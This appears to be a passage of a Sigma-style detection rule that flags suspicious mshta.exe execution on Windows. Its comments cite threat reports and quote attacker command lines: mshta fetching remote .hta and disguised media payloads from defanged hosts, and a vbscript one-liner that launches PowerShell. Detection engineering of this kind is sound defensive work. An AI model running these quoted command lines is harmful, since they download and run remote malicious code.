  detection:
      selection_parent_image:
          ParentImage|endswith: 'mshta.exe'
      selection_image:
          Image|endswith: 'mshta.exe'
      selection_cmdline:
          - CommandLine|endswith:
              - '.hta' # malicious HTA in %TEMP% https://asec.ahnlab.com/en/96295/; mshta.exe hXXps://secfileshare[.]com/4.hta; https://cert.gov.ua/article/6284949; https://cert.gov.ua/article/6286219; https://isc.sans.edu/diary/32796; https://cert.gov.ua/article/6288271; https://blog.synapticsystems.de/uac-0184-from-hta-to-a-signed-network-stack/; https://asec.ahnlab.com/en/93855/; https://blog.talosintelligence.com/uat-11795-deploys-novel-starland-rat-and-bespoke-wldr-c2-implant-in-financially-motivated-campaign/; https://asec.ahnlab.com/en/94552/; https://asec.ahnlab.com/en/95171/; https://www.hudsonrock.com/blog/hbo-max-ads-on-a-compromised-reddit-account-exposed-a-massive-pasteswitch-clickfix-operation; https://www.trellix.com/blogs/research/sidecopy-threat-intel-mshta-execution-rat-deployment/; https://www.malware-traffic-analysis.net/2026/09/15/index.html; https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/
              - '.xll' #mshta hxxp://80.64[.]30.238/evil.xll; https://cloud.google.com/blog/topics/threat-intelligence/unc5142-etherhiding-distribute-malware/
              - '.mp4' #mshta hxxp://80.64[.]30.238/evil.mp4; https://cloud.google.com/blog/topics/threat-intelligence/unc5142-etherhiding-distribute-malware/
              - '.mp3' #mshta hxxp://80.64[.]30.238/evil.mp3; https://cloud.google.com/blog/topics/threat-intelligence/unc5142-etherhiding-distribute-malware/
              - '.wav' #mshta hxxp://80.64[.]30.238/evil.wav; https://cloud.google.com/blog/topics/threat-intelligence/unc5142-etherhiding-distribute-malware/
              - '.dat' #mshta hxxp://80.64[.]30.238/evil.dat; https://cloud.google.com/blog/topics/threat-intelligence/unc5142-etherhiding-distribute-malware/
              - '.odd' #mshta hxxp://23.254.243[.]4/pjdl.odd; https://www.acronis.com/en/tru/posts/fake-adult-websites-pop-realistic-windows-update-screen-to-deliver-stealers-via-clickfix/
          - CommandLine|contains:
              - '\\'
              - 'wscript'
              - 'CreateObject'
              - 'ActiveXObject'
              - 'vbscript' #mshta vbscript:close(createobject("wscript.shell").run("powershell $ProgressPreference = 'SilentlyContinue';...; https://www.bitdefender.com/en-us/blog/labs/microsofts-mshta-legacy-malware-windows
              - 'javascript' #https://www.magicsword.io/blog/apple-ios-certificate-windows-malware ; https://blogs.jpcert.or.jp/en/2026/07/apt-c-60_2026.html
              - 'http' #https://cert.gov.ua/article/6284949 mshta.exe hXXps://secfileshare[.]com/4.hta; https://www.zscaler.com/blogs/security-research/apt37-targets-windows-rust-backdoor-and-python-loader; https://cert.gov.ua/article/6286219; https://cloud.google.com/blog/topics/threat-intelligence/unc1069-targets-cryptocurrency-ai-social-engineering/; https://www.trendmicro.com/en_us/research/26/e/installfix-and-claude-code.html ;https://blog.synapticsystems.de/uac-0247-malware-targeting-fpv-operators/; https://isc.sans.edu/diary/rss/33018; https://www.microsoft.com/en-us/security/blog/2026/07/16/acr-stealer-two-observed-intrusion-chains-amid-increased-threat-activity/; https://www.rapid7.com/blog/post/tr-exposed-webdav-malware-delivery-lab-analysis/; https://www.netskope.com/jp/blog/malware-on-the-blockchain-an-ongoing-campaigns-new-webrtc-twist; https://www.cyderes.com/howler-cell/job-offer-attack-chains-analysis
              - 'close' #https://www.mcafee.com/blogs/other-blogs/mcafee-labs/astaroth-banking-trojan-abusing-github-for-resilience/
              - 'DavWWWRoot' #mshta \\dbexport.zip\DavWWWRoot\calc_hta.hta
      filters_chain1:
          ParentImage|endswith: 'TeamViewer.exe' #"C:\Windows\system32\mshta.exe" C:\Users\xxx\AppData\Local\Temp\TeamViewer\TeamViewer11_Exit.hta
          CommandLine|contains|all:
              - '\TeamViewer'
              - '_Exit.hta'
      condition: ((selection_image and selection_cmdline) and not filters_chain1) or selection_parent_image
  falsepositives:
      - unknown
  level: high
